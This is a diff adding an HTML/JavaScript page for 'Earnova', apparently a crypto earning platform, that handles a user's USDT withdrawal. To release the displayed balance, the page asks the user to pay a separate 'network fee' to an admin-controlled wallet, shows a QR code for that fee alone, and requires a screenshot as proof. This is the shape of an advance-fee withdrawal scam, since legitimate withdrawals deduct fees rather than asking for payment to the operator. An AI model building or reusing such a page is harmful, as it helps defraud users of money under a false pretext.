@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Earnova | Crypto Payment Confirmation</title>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="https://kit.fontawesome.com/c03cee45d4.js" crossorigin="anonymous"></script>
+  <!-- Firestore SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    :root {
+      --primary: #6366f1;
+      --primary-dark: #4f46e5;
+      --secondary: #06b6d4;
+      --accent: #8b5cf6;
+      --success: #10b981;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --dark: #0f172a;
+      --darker: #020617;
+      --card: #1e293b;
+      --card-hover: #334155;
+      --text: #f8fafc;
+      --text-muted: #94a3b8;
+      --border: rgba(255, 255, 255, 0.1);
+      --gradient-1: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+      --gradient-success: linear-gradient(135deg, #10b981 0%, #06b6d4 100%);
+      --gradient-warning: linear-gradient(135deg, #f59e0b 0%, #ef4444 100%);
+      --gradient-crypto: linear-gradient(135deg, #f59e0b 0%, #10b981 100%);
+      --shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+
+    body {
+      font-family: 'Outfit', sans-serif;
+      background: var(--darker);
+      color: var(--text);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Background */
+    .bg-animation {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+      background: 
+        radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.15) 0px, transparent 50%),
+        radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.15) 0px, transparent 50%);
+      animation: bgPulse 15s ease infinite;
+    }
+
+    @keyframes bgPulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    /* Header */
+    .header {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 1000;
+      background: rgba(15, 23, 42, 0.9);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .back-btn {
+      width: 40px;
+      height: 40px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text);
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-decoration: none;
+    }
+
+    .back-btn:hover {
+      background: rgba(99, 102, 241, 0.1);
+      border-color: var(--primary);
+    }
+
+    .header-title {
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    /* Container */
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 100px 20px 40px;
+    }
+
+    /* Pending Card */
+    .pending-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 24px;
+      margin-bottom: 24px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: var(--shadow);
+      animation: slideUp 0.5s ease;
+      text-align: center;
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .pending-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: var(--gradient-crypto);
+    }
+
+    .crypto-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 16px;
+      background: rgba(245, 158, 11, 0.1);
+      border: 1px solid rgba(245, 158, 11, 0.3);
+      border-radius: 50px;
+      font-size: 13px;
+      color: var(--warning);
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+
+    .crypto-badge i {
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .pending-amount {
+      font-size: 36px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #fff 0%, var(--text-muted) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 8px;
+    }
+
+    .network-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 12px;
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+      border-radius: 20px;
+      font-size: 12px;
+      color: var(--success);
+    }
+
+    /* Warning Cards */
+    .warning-card {
+      background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(245, 158, 11, 0.1));
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      animation: slideUp 0.5s ease 0.1s both;
+    }
+
+    .warning-icon {
+      width: 40px;
+      height: 40px;
+      background: rgba(239, 68, 68, 0.2);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--danger);
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+
+    .warning-content h4 {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--danger);
+      margin-bottom: 4px;
+    }
+
+    .warning-content p {
+      font-size: 13px;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+
+    /* Wallet Details Card */
+    .details-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 24px;
+      margin-bottom: 20px;
+      animation: slideUp 0.5s ease 0.2s both;
+    }
+
+    .details-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .details-icon {
+      width: 48px;
+      height: 48px;
+      background: var(--gradient-crypto);
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      color: white;
+    }
+
+    .details-title {
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .details-subtitle {
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .detail-row:last-child {
+      border-bottom: none;
+    }
+
+    .detail-label {
+      font-size: 14px;
+      color: var(--text-muted);
+    }
+
+    .detail-value {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--text);
+    }
+
+    .detail-value.highlight {
+      color: var(--warning);
+      font-size: 18px;
+    }
+
+    .detail-value.crypto {
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      background: rgba(15, 23, 42, 0.8);
+      padding: 8px 12px;
+      border-radius: 8px;
+      max-width: 200px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .copy-btn {
+      padding: 6px 12px;
+      background: rgba(99, 102, 241, 0.1);
+      border: 1px solid rgba(99, 102, 241, 0.3);
+      border-radius: 8px;
+      color: var(--primary);
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .copy-btn:hover {
+      background: rgba(99, 102, 241, 0.2);
+      transform: scale(1.05);
+    }
+
+    /* QR Code Section */
+    .qr-section {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 24px;
+      margin-bottom: 20px;
+      text-align: center;
+      animation: slideUp 0.5s ease 0.25s both;
+    }
+
+    .qr-title {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+
+    .qr-container {
+      width: 200px;
+      height: 200px;
+      margin: 0 auto 16px;
+      background: white;
+      border-radius: 16px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .qr-placeholder {
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #f0f0f0 25%, #e0e0e0 25%, #e0e0e0 50%, #f0f0f0 50%, #f0f0f0 75%, #e0e0e0 75%);
+      background-size: 20px 20px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #666;
+      font-size: 12px;
+    }
+
+    .qr-note {
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+
+    /* Upload Section */
+    .upload-section {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 24px;
+      margin-bottom: 20px;
+      animation: slideUp 0.5s ease 0.3s both;
+    }
+
+    .upload-title {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .upload-desc {
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-bottom: 16px;
+    }
+
+    .drop-zone {
+      background: rgba(255, 255, 255, 0.03);
+      border: 2px dashed var(--border);
+      border-radius: 16px;
+      padding: 40px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .drop-zone:hover {
+      border-color: var(--primary);
+      background: rgba(99, 102, 241, 0.05);
+    }
+
+    .drop-zone.has-file {
+      border-color: var(--success);
+      background: rgba(16, 185, 129, 0.05);
+    }
+
+    .drop-zone i {
+      font-size: 48px;
+      color: var(--text-muted);
+      margin-bottom: 12px;
+      transition: all 0.3s ease;
+    }
+
+    .drop-zone:hover i {
+      color: var(--primary);
+      transform: scale(1.1);
+    }
+
+    .drop-title {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .drop-subtitle {
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+
+    .file-preview {
+      display: none;
+      align-items: center;
+      gap: 12px;
+      margin-top: 16px;
+      padding: 12px;
+      background: rgba(16, 185, 129, 0.1);
+      border-radius: 12px;
+    }
+
+    .file-preview.show {
+      display: flex;
+    }
+
+    .file-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--success);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+    }
+
+    .file-info {
+      flex: 1;
+      text-align: left;
+    }
+
+    .file-name {
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 2px;
+    }
+
+    .file-size {
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+
+    .file-remove {
+      width: 32px;
+      height: 32px;
+      background: rgba(239, 68, 68, 0.1);
+      border: none;
+      border-radius: 8px;
+      color: var(--danger);
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .file-remove:hover {
+      background: rgba(239, 68, 68, 0.2);
+    }
+
+    #fileInput {
+      display: none;
+    }
+
+    /* Submit Button */
+    .submit-btn {
+      width: 100%;
+      padding: 18px;
+      background: var(--gradient-crypto);
+      color: white;
+      border: none;
+      border-radius: 16px;
+      font-family: inherit;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(245, 158, 11, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+      animation: slideUp 0.5s ease 0.4s both;
+    }
+
+    .submit-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(245, 158, 11, 0.6);
+    }
+
+    .submit-btn:disabled {
+      background: var(--card-hover);
+      color: var(--text-muted);
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .submit-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      transition: 0.5s;
+    }
+
+    .submit-btn:hover::before {
+      left: 100%;
+    }
+
+    .loader {
+      width: 20px;
+      height: 20px;
+      border: 3px solid white;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Info Footer */
+    .info-footer {
+      text-align: center;
+      padding: 20px;
+      color: var(--text-muted);
+      font-size: 13px;
+      animation: slideUp 0.5s ease 0.5s both;
+    }
+
+    .info-footer i {
+      color: var(--primary);
+      margin-right: 6px;
+    }
+
+    /* Network Fee Notice */
+    .fee-notice-card {
+      background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(139, 92, 246, 0.1));
+      border: 1px solid rgba(99, 102, 241, 0.3);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      animation: slideUp 0.5s ease 0.15s both;
+    }
+
+    .fee-notice-icon {
+      width: 40px;
+      height: 40px;
+      background: rgba(99, 102, 241, 0.2);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--primary);
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+
+    .fee-notice-content h4 {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 4px;
+    }
+
+    .fee-notice-content p {
+      font-size: 13px;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+
+    /* Responsive */
+    @media (max-width: 640px) {
+      .container {
+        padding: 90px 16px 40px;
+      }
+      
+      .pending-amount {
+        font-size: 28px;
+      }
+
+      .detail-value.crypto {
+        max-width: 150px;
+        font-size: 11px;
+      }
+
+      .qr-container {
+        width: 160px;
+        height: 160px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background -->
+  <div class="bg-animation"></div>
+
+  <!-- Header -->
+  <header class="header">
+    <a href="withdraw.html" class="back-btn">
+      <i class="fas fa-arrow-left"></i>
+    </a>
+    <div class="header-title">Crypto Payment</div>
+    <div style="width: 40px;"></div>
+  </header>
+
+  <!-- Main Container -->
+  <div class="container">
+    
+    <!-- Pending Amount Card -->
+    <div class="pending-card">
+      <div class="crypto-badge">
+        <i class="fas fa-coins"></i>
+        USDT Withdrawal
+      </div>
+      <div class="pending-amount" id="pendingUSD">$0.00</div>
+      <div class="network-badge">
+        <i class="fas fa-network-wired"></i>
+        <span id="networkType">TRC20 Network</span>
+      </div>
+    </div>
+
+    <!-- Important Warning -->
+    <div class="warning-card">
+      <div class="warning-icon">
+        <i class="fas fa-exclamation-triangle"></i>
+      </div>
+      <div class="warning-content">
+        <h4>Network Warning</h4>
+        <p>Only send USDT on the <span id="warningNetwork">TRC20 (Tron)</span> network. Sending on any other network will result in permanent loss of funds.</p>
+      </div>
+    </div>
+
+    <!-- Wallet Details -->
+    <div class="details-card">
+      <div class="details-header">
+        <div class="details-icon">
+          <i class="fas fa-wallet"></i>
+        </div>
+        <div>
+          <div class="details-title">Wallet Address</div>
+          <div class="details-subtitle">Send USDT to this address</div>
+        </div>
+      </div>
+
+      <div class="detail-row">
+        <span class="detail-label">Wallet Address</span>
+        <div style="display: flex; align-items: center; gap: 8px;">
+          <span class="detail-value crypto" id="walletAddress">Loading...</span>
+          <button class="copy-btn" onclick="copyToClipboard('walletAddress')">
+            <i class="fas fa-copy"></i>
+          </button>
+        </div>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">Network</span>
+        <span class="detail-value" style="color: var(--success);" id="displayNetwork">TRC20 (Tron)</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">Pending withdraw amount</span>
+        <span class="detail-value highlight" id="sendAmount">$0.00</span>
+      </div>
+
+      <div class="detail-row">
+        <span class="detail-label">Network Fee</span>
+        <span class="detail-value" style="color: var(--warning);" id="networkFee">$0.00</span>
+      </div>
+
+      <div class="detail-row">
+        <span class="detail-label">Destination Address</span>
+        <span class="detail-value crypto" id="destAddress" style="font-size: 11px; max-width: 180px;">Not set</span>
+      </div>
+    </div>
+
+    <!-- Network Fee Notice -->
+    <div class="fee-notice-card">
+      <div class="fee-notice-icon">
+        <i class="fas fa-gas-pump"></i>
+      </div>
+      <div class="fee-notice-content">
+        <h4>Network Fee Required</h4>
+        <p>The network fee shown is required to process your transaction on the blockchain. This fee is paid separately and is not deducted from your withdrawal amount.</p>
+      </div>
+    </div>
+
+    <!-- QR Code Section -->
+    <div class="qr-section">
+      <div class="qr-title">Scan to Pay</div>
+      <div class="qr-container">
+        <div class="qr-placeholder" id="qrPlaceholder">
+          <i class="fas fa-qrcode" style="font-size: 64px; color: #ccc;"></i>
+        </div>
+      </div>
+      <div class="qr-note" id="qrNote">QR code will be generated based on admin wallet address</div>
+    </div>
+
+    <!-- Upload Section -->
+    <div class="upload-section">
+      <div class="upload-title">Upload Transaction Proof</div>
+      <div class="upload-desc">Please upload screenshot of your successful transaction. Supported formats: JPG, PNG, PDF</div>
+      
+      <label for="fileInput" class="drop-zone" id="dropZone">
+        <i class="fas fa-cloud-upload-alt"></i>
+        <div class="drop-title">Click or drag screenshot here</div>
+        <div class="drop-subtitle">Maximum file size: 5MB</div>
+        
+        <div class="file-preview" id="filePreview">
+          <div class="file-icon">
+            <i class="fas fa-file-image"></i>
+          </div>
+          <div class="file-info">
+            <div class="file-name" id="fileName">receipt.jpg</div>
+            <div class="file-size" id="fileSize">2.4 MB</div>
+          </div>
+          <button class="file-remove" onclick="removeFile(event)">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+      </label>
+      
+      <input type="file" id="fileInput" accept="image/*,.pdf" onchange="handleFileSelect(event)">
+    </div>
+
+    <!-- Confirm Button -->
+    <button class="submit-btn" id="confirmBtn" onclick="confirmPayment()">
+      <span>I've Sent the USDT</span>
+      <div class="loader" id="btnLoader"></div>
+    </button>
+
+    <!-- Info Footer -->
+    <div class="info-footer">
+      <i class="fas fa-shield-alt"></i>
+      Crypto transactions are irreversible. Double-check the address before sending. Processing time: 5-30 minutes after confirmation.
+    </div>
+
+  </div>
+
+  <!-- Firebase Config -->
+  <script src="Js/firebase.js"></script>
+  
+  <script>
+    // Get withdrawal data from localStorage
+    let pendingUSD = parseFloat(localStorage.getItem('pendingWithdrawUSD')) || 0;
+    let networkFee = parseFloat(localStorage.getItem('pendingNetworkFee')) || 0;
+    let destinationAddress = localStorage.getItem('withdrawalAddress') || 'Not set';
+    let db = null;
+    let adminWalletAddress = '';
+    let adminNetwork = 'TRC20';
+    
+    // Initialize display and Firebase
+    document.addEventListener('DOMContentLoaded', () => {
+      updateDisplay();
+      initializeFirebase();
+    });
+    
+    function updateDisplay() {
+      document.getElementById('pendingUSD').textContent = '$' + pendingUSD.toFixed(2) + ' USDT';
+      document.getElementById('sendAmount').textContent = '$' + pendingUSD.toFixed(2);
+      document.getElementById('networkFee').textContent = '$' + networkFee.toFixed(2);
+      document.getElementById('destAddress').textContent = destinationAddress;
+    }
+    
+    // Initialize Firestore and load crypto details from admin settings
+    function initializeFirebase() {
+      if (typeof firebase !== 'undefined' && firebase.apps.length > 0) {
+        db = firebase.firestore();
+        loadCryptoDetails();
+      } else {
+        console.log('Firebase not ready, using default crypto details');
+        // Fallback defaults
+        adminWalletAddress = 'THxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
+        adminNetwork = 'TRC20';
+        updateCryptoDisplay();
+      }
+    }
+    
+    // Load crypto details from Firestore settings (set by admin)
+    async function loadCryptoDetails() {
+      try {
+        const cryptoDoc = await db.collection('settings').doc('crypto').get();
+        if (cryptoDoc.exists) {
+          const data = cryptoDoc.data();
+          adminWalletAddress = data.address || 'THxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
+          adminNetwork = data.network || 'TRC20';
+          updateCryptoDisplay();
+        } else {
+          // No admin settings yet, use defaults
+          adminWalletAddress = 'THxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
+          adminNetwork = 'TRC20';
+          updateCryptoDisplay();
+        }
+      } catch (error) {
+        console.error('Error loading crypto details:', error);
+        adminWalletAddress = 'THxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
+        adminNetwork = 'TRC20';
+        updateCryptoDisplay();
+      }
+    }
+    
+    // Update display with loaded crypto details
+    function updateCryptoDisplay() {
+      document.getElementById('walletAddress').textContent = adminWalletAddress;
+      document.getElementById('displayNetwork').textContent = adminNetwork + ' (Tron)';
+      document.getElementById('networkType').textContent = adminNetwork + ' Network';
+      document.getElementById('warningNetwork').textContent = adminNetwork + ' (Tron)';
+      
+      // Generate QR code with loaded address
+      if (adminWalletAddress && adminWalletAddress !== 'THxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx') {
+        generateQRCode(adminWalletAddress, pendingUSD);
+      }
+    }
+    
+    // Generate QR Code using QRServer API
+    function generateQRCode(address, amount) {
+      const qrContainer = document.getElementById('qrPlaceholder');
+      const qrNote = document.getElementById('qrNote');
+      
+      // Create QR data for USDT transfer
+      const qrData = `tron:${address}?amount=${networkFee}&token=USDT`;
+      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrData)}`;
+      
+      qrContainer.innerHTML = `<img src="${qrUrl}" alt="Payment QR Code" style="width: 100%; height: 100%; border-radius: 8px; object-fit: contain;">`;
+      qrNote.textContent = `Scan to send ${networkFee} USDT to ${adminNetwork} address`;
+    }
+    
+    // Copy to clipboard
+    function copyToClipboard(elementId) {
+      const text = document.getElementById(elementId).textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        Swal.fire({
+          toast: true,
+          position: 'top',
+          title: 'Copied!',
+          text: 'Wallet address copied to clipboard',
+          icon: 'success',
+          timer: 2000,
+          showConfirmButton: false,
+          background: '#0f172a',
+          color: '#f8fafc'
+        });
+      });
+    }
+    
+    // File handling
+    let selectedFile = null;
+    
+    function handleFileSelect(event) {
+      const file = event.target.files[0];
+      if (!file) return;
+      
+      if (file.size > 5 * 1024 * 1024) {
+        Swal.fire({
+          title: 'File Too Large',
+          text: 'Maximum file size is 5MB',
+          icon: 'error',
+          confirmButtonColor: '#6366f1',
+          background: '#0f172a',
+          color: '#f8fafc'
+        });
+        return;
+      }
+      
+      selectedFile = file;
+      const dropZone = document.getElementById('dropZone');
+      const preview = document.getElementById('filePreview');
+      
+      document.getElementById('fileName').textContent = file.name;
+      document.getElementById('fileSize').textContent = formatFileSize(file.size);
+      
+      dropZone.classList.add('has-file');
+      preview.classList.add('show');
+    }
+    
+    function removeFile(event) {
+      event.preventDefault();
+      event.stopPropagation();
+      
+      selectedFile = null;
+      document.getElementById('fileInput').value = '';
+      
+      const dropZone = document.getElementById('dropZone');
+      const preview = document.getElementById('filePreview');
+      
+      dropZone.classList.remove('has-file');
+      preview.classList.remove('show');
+    }
+    
+    function formatFileSize(bytes) {
+      if (bytes === 0) return '0 Bytes';
+      const k = 1024;
+      const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+      const i = Math.floor(Math.log(bytes) / Math.log(k));
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }
+    
+    // Drag and drop
+    const dropZone = document.getElementById('dropZone');
+    
+    dropZone.addEventListener('dragover', (e) => {
+      e.preventDefault();
+      dropZone.style.borderColor = 'var(--primary)';
+      dropZone.style.background = 'rgba(99, 102, 241, 0.05)';
+    });
+    
+    dropZone.addEventListener('dragleave', () => {
+      if (!selectedFile) {
+        dropZone.style.borderColor = '';
+        dropZone.style.background = '';
+      }
+    });
+    
+    dropZone.addEventListener('drop', (e) => {
+      e.preventDefault();
+      const files = e.dataTransfer.files;
+      if (files.length > 0) {
+        document.getElementById('fileInput').files = files;
+        handleFileSelect({ target: { files: files } });
+      }
+    });
+    
+    // Confirm Payment - Now saves to Firestore for admin to see
+    async function confirmPayment() {
+      if (!selectedFile) {
+        Swal.fire({
+          title: 'Upload Required',
+          text: 'Please upload your transaction screenshot before confirming.',
+          icon: 'warning',
+          confirmButtonColor: '#6366f1',
+          background: '#0f172a',
+          color: '#f8fafc'
+        });
+        return;
+      }
+      
+      const btn = document.getElementById('confirmBtn');
+      const loader = document.getElementById('btnLoader');
+      const btnText = btn.querySelector('span');
+      
+      btn.disabled = true;
+      btnText.style.display = 'none';
+      loader.style.display = 'block';
+      
+      try {
+        // Save crypto withdrawal to Firestore (admin will see this)
+        const withdrawalId = 'WD' + Date.now();
+        const userEmail = localStorage.getItem('email') || 'anonymous';
+        const username = localStorage.getItem('username') || 'anonymous';
+        
+        const withdrawalData = {
+          id: withdrawalId,
+          userId: username,
+          userEmail: userEmail,
+          amount: pendingUSD,
+          networkFee: networkFee,
+          type: 'crypto',
+          status: 'pending',
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          cryptoDetails: {
+            network: adminNetwork,
+            adminWalletAddress: adminWalletAddress,
+            destinationAddress: destinationAddress
+          },
+          receiptFile: selectedFile.name,
+          processedBy: null,
+          processedAt: null
+        };
+        
+        // Save to Firestore withdrawals collection (admin reads from here)
+        if (db) {
+          await db.collection('withdrawals').doc(withdrawalId).set(withdrawalData);
+          console.log('Crypto withdrawal saved to Firestore:', withdrawalId);
+        }
+        
+        // Also save to localStorage for user history
+        localStorage.setItem('withdrawalStatus', 'pending');
+        localStorage.setItem('withdrawalTimestamp', Date.now().toString());
+        localStorage.setItem('currentWithdrawalId', withdrawalId);
+        
+        // Add to transaction history
+        addPendingTransaction(withdrawalId);
+        
+        // Redirect to success page
+        window.location.href = 'success.html';
+        
+      } catch (error) {
+        console.error('Error saving withdrawal:', error);
+        Swal.fire({
+          title: 'Error',
+          text: 'Failed to submit withdrawal. Please try again.',
+          icon: 'error',
+          confirmButtonColor: '#6366f1',
+          background: '#0f172a',
+          color: '#f8fafc'
+        });
+        
+        btn.disabled = false;
+        btnText.style.display = 'block';
+        loader.style.display = 'none';
+      }
+    }
+    
+    function addPendingTransaction(withdrawalId) {
+      const transactions = JSON.parse(localStorage.getItem('transactions')) || [];
+      const newTransaction = {
+        id: withdrawalId,
+        type: 'withdrawal',
+        title: 'Crypto Withdrawal - Pending',
+        amount: -pendingUSD,
+        status: 'pending',
+        date: new Date().toISOString(),
+        timestamp: Date.now(),
+        description: 'USDT withdrawal of $' + pendingUSD.toFixed(2) + ' awaiting confirmation on ' + adminNetwork,
+        cryptoDetails: {
+          network: adminNetwork,
+          destinationAddress: destinationAddress,
+          networkFee: networkFee
+        }
+      };
+      transactions.unshift(newTransaction);
+      localStorage.setItem('transactions', JSON.stringify(transactions));
+    }
+    
+    // Custom SweetAlert styles
+    const style = document.createElement('style');
+    style.textContent = `
+      .swal2-popup {
+        border: 1px solid rgba(99, 102, 241, 0.3) !important;
+        border-radius: 20px !important;
+      }
+    `;
+    document.head.appendChild(style);
+  </script>
+</body>
+</html>
